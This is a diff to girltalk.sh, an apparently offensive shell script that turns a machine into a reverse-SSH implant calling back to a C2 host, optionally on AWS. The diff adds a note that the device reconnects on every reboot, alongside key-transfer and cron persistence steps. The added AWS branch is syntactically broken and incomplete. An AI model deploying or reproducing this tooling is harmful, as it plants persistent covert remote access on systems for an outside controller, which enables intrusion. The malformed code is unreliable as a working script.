@@ -4,6 +4,8 @@
 #                                                              #
 # Let's setup an automated reverse ssh device!                 #
 #                                                              #
+# Once complete, the device will automatically attempt a       #
+# connection when the device reboots                           #
 #                                                              #
 # xoxo Hexadecim8 did this xoxo                                #
 #                                                              #
@@ -19,7 +21,7 @@ through NAT.
 girltalk.sh:
   -a	Use AWS C2 infrastructure.
   -s    Use autossh method (more stable)
-  -k    SSH key.
+  -k    SSH key (full path).
   -c    C2 host.
   -u	C2 username.
   -l    Local username to use.
@@ -27,12 +29,6 @@ girltalk.sh:
 usage:	 girltalk.sh -c <C2 hostname/IP> -l <local_username> -u <C2_username> 
 example: girltalk.sh -c host.aws.com -u ubuntu -l hatchetface -a -k ~/.ssh/amazon.keypair.pem
 "
-
-
-# AWS infrastructure selection
-if [ -a -eq 1 ]; then
-        echo "sanity check"
-        exit
 
 
 # Check if any flags were set. If not, print out help.
@@ -50,7 +46,7 @@ do
 			AWS=$OPTARG
 			;;
 		k)
-			KEY=$OPTARG
+			KEYNAME=$OPTARG
 			;;
 		c)
 			HOST=$OPTARG
@@ -133,6 +129,16 @@ fi
 # Generating an ssh key on your C2
     ssh $HOST 'ssh-keygen'
 
+########################################################
+# AWS infrastructure selection                         #
+# Falls over to default "off" if -a is not selected.   #
+#                                                      #
+########################################################
+
+if [ -a ${AWS+x}]; then
+ssh -i ${KEYNAME} 
+
+else
 
 # Creating hmu.sh, which should be run on the C2 host. This file transfers the C2 key back to the host and attaches to the SSH session.
     echo "${bold}### Creating & transferring remote connection script ###"
@@ -149,6 +155,8 @@ fi
     rm cronsh
     printf "\n"
 
+        exit
+fi
 
 # Finishing script
     echo "${bold}### Donezo! Please reboot the machine. ###"
